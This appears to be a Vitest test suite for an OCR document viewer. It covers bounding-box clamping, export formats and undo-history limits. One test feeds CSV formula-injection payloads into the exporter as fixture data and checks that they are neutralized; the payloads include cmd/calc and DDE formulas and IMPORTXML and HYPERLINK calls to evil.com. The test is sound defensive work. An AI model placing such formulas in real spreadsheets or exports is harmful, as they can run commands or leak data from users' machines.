import React from 'react';
import { render, screen, fireEvent } from '@testing-library/react';
import { describe, it, expect } from 'vitest';
import {
  bboxToSvgRect,
  bboxToPolygon,
  polygonToSvgPoints,
  polygonToBbox,
  clampBbox,
} from '../lib/transformUtils';
import {
  exportDocumentAsJson,
  exportDocumentAsTxt,
  exportDocumentAsCsv,
} from '../lib/exportUtils';
import { DocumentProvider, useDocumentContext } from '../context/DocumentContext';
import { DocumentOCRResult, BoundingBoxTuple, PolygonPoint } from '../types/ocr';
import { SAMPLE_CLEAN_CURSIVE, SAMPLE_MULTIPAGE } from '../lib/sampleDocuments';

describe('Empirical Challenger Suite: Milestone 5 Frontend Verification', () => {
  // =========================================================================
  // 1. TRANSFORM UTILS & BOUNDING BOX HARDENING
  // =========================================================================
  describe('1. transformUtils - Inverted, Negative, NaN, Infinite & Degenerate Bboxes', () => {
    it('handles inverted bounding boxes where ymin > ymax and xmin > xmax', () => {
      // Inverted box: ymin=0.8, xmin=0.9, ymax=0.2, xmax=0.1
      const invertedBbox: BoundingBoxTuple = [0.8, 0.9, 0.2, 0.1];
      const clamped = clampBbox(invertedBbox);

      expect(clamped[0]).toBe(0.2); // ymin
      expect(clamped[1]).toBe(0.1); // xmin
      expect(clamped[2]).toBe(0.8); // ymax
      expect(clamped[3]).toBe(0.9); // xmax

      const rect = bboxToSvgRect(invertedBbox, 1000, 2000);
      expect(rect.x).toBeCloseTo(100);
      expect(rect.y).toBeCloseTo(400);
      expect(rect.width).toBeCloseTo(800);
      expect(rect.height).toBeCloseTo(1200);

      const poly = bboxToPolygon(invertedBbox);
      expect(poly).toEqual([
        [0.1, 0.2],
        [0.9, 0.2],
        [0.9, 0.8],
        [0.1, 0.8],
      ]);
    });

    it('handles negative and extreme out-of-bounds bounding boxes', () => {
      // Highly negative out of bounds: [-5.0, -10.0, -2.0, -1.0]
      const allNegativeBbox: BoundingBoxTuple = [-5.0, -10.0, -2.0, -1.0];
      const clampedAllNeg = clampBbox(allNegativeBbox);
      expect(clampedAllNeg).toEqual([0, 0, 0, 0]);

      // Spanning across negative to > 1: [-2.0, -3.0, 4.0, 5.0]
      const extremeSpanBbox: BoundingBoxTuple = [-2.0, -3.0, 4.0, 5.0];
      const clampedSpan = clampBbox(extremeSpanBbox);
      expect(clampedSpan).toEqual([0, 0, 1, 1]);

      const rect = bboxToSvgRect(extremeSpanBbox, 800, 1200);
      expect(rect.x).toBe(0);
      expect(rect.y).toBe(0);
      expect(rect.width).toBe(800);
      expect(rect.height).toBe(1200);
    });

    it('handles NaN, Infinity, -Infinity and invalid types in bounding box', () => {
      const nanBbox = [NaN, Infinity, -Infinity, NaN] as unknown as BoundingBoxTuple;
      const rect = bboxToSvgRect(nanBbox, 1000, 1000);

      expect(Number.isFinite(rect.x)).toBe(true);
      expect(Number.isFinite(rect.y)).toBe(true);
      expect(Number.isFinite(rect.width)).toBe(true);
      expect(Number.isFinite(rect.height)).toBe(true);
      expect(rect.width).toBeGreaterThanOrEqual(1);
      expect(rect.height).toBeGreaterThanOrEqual(1);

      const poly = bboxToPolygon(nanBbox);
      poly.forEach(([px, py]) => {
        expect(Number.isFinite(px)).toBe(true);
        expect(Number.isFinite(py)).toBe(true);
      });
    });

    it('handles degenerate zero-dimension bboxes without returning 0 or negative width/height', () => {
      const pointBbox: BoundingBoxTuple = [0.4, 0.4, 0.4, 0.4];
      const rect = bboxToSvgRect(pointBbox, 1000, 1000);

      expect(rect.x).toBe(400);
      expect(rect.y).toBe(400);
      expect(rect.width).toBe(1); // Min 1px fallback
      expect(rect.height).toBe(1); // Min 1px fallback
    });

    it('handles document dimensions being zero, negative, NaN or Infinity', () => {
      const bbox: BoundingBoxTuple = [0.1, 0.1, 0.5, 0.5];

      const zeroDoc = bboxToSvgRect(bbox, 0, 0);
      expect(zeroDoc.x).toBe(0);
      expect(zeroDoc.y).toBe(0);
      expect(zeroDoc.width).toBe(1);
      expect(zeroDoc.height).toBe(1);

      const negDoc = bboxToSvgRect(bbox, -500, -1000);
      expect(negDoc.x).toBe(0);
      expect(negDoc.y).toBe(0);
      expect(negDoc.width).toBe(1);
      expect(negDoc.height).toBe(1);

      const nanDoc = bboxToSvgRect(bbox, NaN, NaN);
      expect(nanDoc.x).toBe(0);
      expect(nanDoc.y).toBe(0);
      expect(nanDoc.width).toBe(1);
      expect(nanDoc.height).toBe(1);
    });

    it('polygonToBbox and polygonToSvgPoints handle edge cases', () => {
      // Empty polygon
      expect(polygonToBbox([])).toEqual([0, 0, 0, 0]);

      // Polygon with out of bounds coordinates
      const rawPoly: PolygonPoint[] = [
        [-0.5, -0.2],
        [1.5, -0.2],
        [1.5, 1.8],
        [-0.5, 1.8],
      ];
      const bboxFromPoly = polygonToBbox(rawPoly);
      expect(bboxFromPoly).toEqual([0, 0, 1, 1]);

      // Polygon to SVG points string with NaN / fallback
      const pointsStr = polygonToSvgPoints(
        [[NaN, 0.5], [0.8, Infinity] as unknown as PolygonPoint],
        1000,
        500
      );
      expect(pointsStr).toBe('0.0,250.0 800.0,0.0');
    });
  });

  // =========================================================================
  // 2. EXPORT UTILITIES & CSV FORMULA INJECTION HARDENING
  // =========================================================================
  describe('2. exportUtils - CSV Formula Injection (CWE-1236) & Export Integrity', () => {
    it('neutralizes all formula injection prefixes (=, +, -, @, \\t, \\r)', () => {
      const injectionDoc: DocumentOCRResult = {
        document_id: 'doc_sec_test',
        filename: 'injection_test.png',
        total_pages: 1,
        mean_confidence: 0.9,
        processing_time_ms: 50,
        full_text: 'Formula injection tests',
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1000,
            mean_confidence: 0.9,
            full_text: 'Formula injection tests',
            lines: [
              {
                line_id: '=cmd|’ /C calc’!A0',
                line_number: 1,
                text: '=SUM(1+1)',
                original_text: '+cmd|’ /C calc’!A0',
                confidence: 0.95,
                bbox: [0.1, 0.1, 0.2, 0.9],
                polygon: bboxToPolygon([0.1, 0.1, 0.2, 0.9]),
                words: [
                  {
                    word_id: '@SUM(1,2)',
                    text: '=1+1',
                    original_text: '-2+5',
                    confidence: 0.95,
                    bbox: [0.1, 0.1, 0.2, 0.3],
                    polygon: bboxToPolygon([0.1, 0.1, 0.2, 0.3]),
                  },
                  {
                    word_id: '\t=DDE("cmd";"/C calc";"__DDE__")',
                    text: '\r=IMPORTXML("http://evil.com","//")',
                    original_text: '+HYPERLINK("http://evil.com","Click")',
                    confidence: 0.92,
                    bbox: [0.1, 0.3, 0.2, 0.6],
                    polygon: bboxToPolygon([0.1, 0.3, 0.2, 0.6]),
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(injectionDoc);
      const lines = csv.split('\n');

      // Check header
      expect(lines[0]).toBe('page,line_number,line_id,word_id,confidence,text,original_text,is_edited,ymin,xmin,ymax,xmax');

      // Check rows: all injected values must start with single quote (') inside the double quotes
      for (let i = 1; i < lines.length; i++) {
        const row = lines[i];
        // Line ID injected with =
        expect(row).toContain('"\'=cmd|’ /C calc’!A0"');
        // Word ID injected with @ or \t
        if (row.includes('@SUM')) {
          expect(row).toContain('"\'@SUM(1,2)"');
          expect(row).toContain('"\'=1+1"');
          expect(row).toContain('"\'-2+5"');
        }
        if (row.includes('DDE')) {
          expect(row).toContain('"\'\t=DDE');
          expect(row).toContain('"\'\r=IMPORTXML');
          expect(row).toContain('"\'+HYPERLINK');
        }
      }
    });

    it('safely escapes embedded quotes, commas, and newlines per RFC 4180', () => {
      const complexDoc: DocumentOCRResult = {
        document_id: 'doc_complex',
        filename: 'complex.png',
        total_pages: 1,
        mean_confidence: 0.85,
        processing_time_ms: 100,
        full_text: 'Text with "quotes", commas, and\nnewlines',
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1000,
            mean_confidence: 0.85,
            full_text: 'Text with "quotes", commas, and\nnewlines',
            lines: [
              {
                line_id: 'line_1',
                line_number: 1,
                text: 'Line with "double quotes", commas, and \n newline',
                original_text: 'Line with "double quotes", commas, and \n newline',
                confidence: 0.85,
                bbox: [0.1, 0.1, 0.2, 0.9],
                polygon: bboxToPolygon([0.1, 0.1, 0.2, 0.9]),
                words: [
                  {
                    word_id: 'w1',
                    text: '"quoted"',
                    original_text: '"quoted"',
                    confidence: 0.85,
                    bbox: [0.1, 0.1, 0.2, 0.5],
                    polygon: bboxToPolygon([0.1, 0.1, 0.2, 0.5]),
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(complexDoc);
      // Double quotes should be escaped as ""
      expect(csv).toContain('"""quoted"""');
    });

    it('exports JSON and TXT documents faithfully with full fidelity', () => {
      const jsonStr = exportDocumentAsJson(SAMPLE_MULTIPAGE);
      const parsed = JSON.parse(jsonStr);

      expect(parsed.document_id).toBe('sample_multipage');
      expect(parsed.total_pages).toBe(3);
      expect(parsed.pages.length).toBe(3);
      expect(parsed.pages[0].page_number).toBe(1);
      expect(parsed.pages[1].page_number).toBe(2);
      expect(parsed.pages[2].page_number).toBe(3);
      expect(parsed.export_timestamp).toBeDefined();

      const txtStr = exportDocumentAsTxt(SAMPLE_MULTIPAGE);
      const pages = txtStr.split('\n\n--- PAGE BREAK ---\n\n');
      expect(pages.length).toBe(3);
      expect(pages[0]).toContain('Chief Complaint');
      expect(pages[1]).toContain('Amoxicillin 500mg');
      expect(pages[2]).toContain('Rest in bed for next 48 hours');
    });
  });

  // =========================================================================
  // 3. DOCUMENT CONTEXT HISTORY MEMORY CAPPING & IMMUTABILITY
  // =========================================================================
  describe('3. DocumentContext - MAX_HISTORY_DEPTH Capping & Immutability Under Churn', () => {
    const ChurnTestComponent: React.FC = () => {
      const ctx = useDocumentContext();
      const [editCount, setEditCount] = React.useState(0);

      return (
        <div>
          <span data-testid="active-text">{ctx.activePage?.lines[0]?.text}</span>
          <span data-testid="can-undo">{ctx.canUndo ? 'true' : 'false'}</span>
          <span data-testid="can-redo">{ctx.canRedo ? 'true' : 'false'}</span>
          <button
            data-testid="btn-single-edit"
            onClick={() => {
              const nextCount = editCount + 1;
              setEditCount(nextCount);
              ctx.updateLineText('p1_l1', `Edit iteration ${nextCount}`);
            }}
          >
            Single Edit
          </button>
          <button
            data-testid="btn-single-undo"
            onClick={() => ctx.undo()}
          >
            Single Undo
          </button>
          <button
            data-testid="btn-single-redo"
            onClick={() => ctx.redo()}
          >
            Single Redo
          </button>
          <button
            data-testid="btn-zoom-in-max"
            onClick={() => {
              for (let i = 0; i < 30; i++) ctx.zoomIn();
            }}
          >
            Zoom In Max
          </button>
          <button
            data-testid="btn-zoom-out-min"
            onClick={() => {
              for (let i = 0; i < 30; i++) ctx.zoomOut();
            }}
          >
            Zoom Out Min
          </button>
          <button data-testid="btn-reset-transform" onClick={() => ctx.resetTransform()}>
            Reset Transform
          </button>
          <span data-testid="scale-value">{ctx.scale}</span>
        </div>
      );
    };

    it('enforces MAX_HISTORY_DEPTH=50 memory capping and does not leak unbounded stack memory across user interactions', () => {
      render(
        <DocumentProvider initialDocument={SAMPLE_CLEAN_CURSIVE}>
          <ChurnTestComponent />
        </DocumentProvider>
      );

      const activeText = screen.getByTestId('active-text');
      const canUndo = screen.getByTestId('can-undo');
      const canRedo = screen.getByTestId('can-redo');
      const btnSingleEdit = screen.getByTestId('btn-single-edit');
      const btnSingleUndo = screen.getByTestId('btn-single-undo');
      const btnSingleRedo = screen.getByTestId('btn-single-redo');

      expect(canUndo.textContent).toBe('false');
      expect(canRedo.textContent).toBe('false');

      // Execute 80 sequential user edits with React re-rendering between each
      for (let i = 1; i <= 80; i++) {
        fireEvent.click(btnSingleEdit);
      }

      expect(activeText.textContent).toBe('Edit iteration 80');
      expect(canUndo.textContent).toBe('true');
      expect(canRedo.textContent).toBe('false');

      // Undo 60 times -> Since history is capped at 50, it should undo exactly 50 times
      // and activeText should be "Edit iteration 30" (80 - 50 = 30), then canUndo becomes false
      for (let i = 0; i < 60; i++) {
        fireEvent.click(btnSingleUndo);
      }

      expect(activeText.textContent).toBe('Edit iteration 30');
      expect(canUndo.textContent).toBe('false');
      expect(canRedo.textContent).toBe('true');

      // Redo once
      fireEvent.click(btnSingleRedo);
      expect(activeText.textContent).toBe('Edit iteration 31');
      expect(canUndo.textContent).toBe('true');

      // Redo 49 more times to reach iteration 80
      for (let i = 0; i < 49; i++) {
        fireEvent.click(btnSingleRedo);
      }
      expect(activeText.textContent).toBe('Edit iteration 80');
      expect(canRedo.textContent).toBe('false');
    });

    it('strictly clamps zoom scale between 0.2 and 5.0 and resets cleanly', () => {
      render(
        <DocumentProvider initialDocument={SAMPLE_CLEAN_CURSIVE}>
          <ChurnTestComponent />
        </DocumentProvider>
      );

      const scaleVal = screen.getByTestId('scale-value');
      expect(scaleVal.textContent).toBe('1');

      // Zoom in to maximum
      fireEvent.click(screen.getByTestId('btn-zoom-in-max'));
      expect(Number(scaleVal.textContent)).toBe(5);

      // Zoom out to minimum
      fireEvent.click(screen.getByTestId('btn-zoom-out-min'));
      expect(Number(scaleVal.textContent)).toBe(0.2);

      // Reset transform
      fireEvent.click(screen.getByTestId('btn-reset-transform'));
      expect(Number(scaleVal.textContent)).toBe(1);
    });
  });
});
